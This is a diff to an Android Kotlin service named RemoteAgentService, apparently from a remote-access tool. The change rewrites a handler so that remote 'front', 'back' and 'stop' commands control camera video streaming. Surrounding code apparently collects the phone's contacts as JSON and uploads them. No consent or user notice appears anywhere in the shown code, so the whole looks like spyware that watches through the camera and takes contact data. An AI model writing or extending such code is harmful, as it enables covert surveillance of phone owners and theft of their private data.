@@ -80,13 +80,6 @@ class RemoteAgentService : Service() {
                     // 🔹 Start ping keepalive
                     startPingTimer()
 
-                    // ✅ Delay video start until handshake is definitely acknowledged
-//                    Handler(Looper.getMainLooper()).postDelayed({
-//                        if (!isStreaming) {
-//                            isStreaming = true
-//                            handleVideo("front")
-//                        }
-//                    }, 1000)
                 }
 
 
@@ -163,16 +156,6 @@ class RemoteAgentService : Service() {
     }
 
 
-//    private fun reconnectWebSocket() {
-//        if (reconnecting) return
-//        reconnecting = true
-//
-//        println("♻️ Reconnecting in 3s...")
-//        Handler(Looper.getMainLooper()).postDelayed({
-//            connectWebSocket()
-//        }, 3000)
-//    }
-
 
     private fun getContactsJson(): String {
         val contactsList = mutableListOf<Map<String, String>>()
@@ -238,11 +221,28 @@ class RemoteAgentService : Service() {
     }
 
     private fun handleVideo(which: String) {
-        val facing = if (which == "front") CameraCharacteristics.LENS_FACING_FRONT
-        else CameraCharacteristics.LENS_FACING_BACK
-        println("🎥 Starting video stream from ${if (which == "front") "front" else "back"} camera")
-        streamCameraVideo(facing)
+        when (which) {
+            "stop" -> {
+                println("🛑 Stop request received")
+                stopCameraStreaming()
+            }
+
+            "front" -> {
+                println("🎥 Switching to FRONT camera")
+                streamCameraVideo(CameraCharacteristics.LENS_FACING_FRONT)
+            }
+
+            "back" -> {
+                println("🎥 Switching to BACK camera")
+                streamCameraVideo(CameraCharacteristics.LENS_FACING_BACK)
+            }
+
+            else -> {
+                println("⚠️ Unknown camera command: $which")
+            }
+        }
     }
+
 
     private fun handleContactsUpload() {
         val contactsJson = getContactsJson()
